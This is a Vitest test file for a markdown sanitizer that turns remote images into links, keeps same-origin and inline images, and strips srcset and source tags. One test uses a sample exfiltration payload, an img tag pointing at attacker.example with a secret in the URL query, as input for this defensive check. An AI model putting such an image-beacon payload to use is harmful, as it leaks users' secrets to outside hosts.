// @vitest-environment happy-dom
import { describe, expect, it } from "vitest";
import { neutralizeExternalImages } from "./markdown";

describe("neutralizeExternalImages", () => {
  it("turns remote images into links so nothing is fetched", () => {
    const out = neutralizeExternalImages('<p>x <img src="https://attacker.example/log?secret=AKIA" alt="図"></p>');
    expect(out).not.toContain("<img");
    expect(out).toContain('href="https://attacker.example/log?secret=AKIA"');
    expect(out).toContain('rel="noopener noreferrer"');
    expect(out).toContain("画像: 図");
  });

  it("treats http, protocol-relative and other schemes as remote", () => {
    for (const src of ["http://a.example/i.png", "//cdn.example/i.png", "ftp://a.example/i.png"]) {
      expect(neutralizeExternalImages(`<img src="${src}">`), src).not.toContain("<img");
    }
  });

  it("keeps same-origin and inline images", () => {
    const same = '<img src="/api/fs/download?path=%2Fa.png&amp;inline=1">';
    expect(neutralizeExternalImages(same)).toContain("<img");
    expect(neutralizeExternalImages('<img src="data:image/png;base64,AAAA">')).toContain("<img");
    expect(neutralizeExternalImages('<img src="rel/pic.png">')).toContain("<img");
  });

  it("drops srcset and <source>, which can carry remote URLs", () => {
    const out = neutralizeExternalImages(
      '<picture><source srcset="https://x.example/a.png"><img src="/ok.png" srcset="https://x.example/b.png 2x"></picture>',
    );
    expect(out).not.toContain("x.example");
    expect(out).toContain('src="/ok.png"');
  });
});
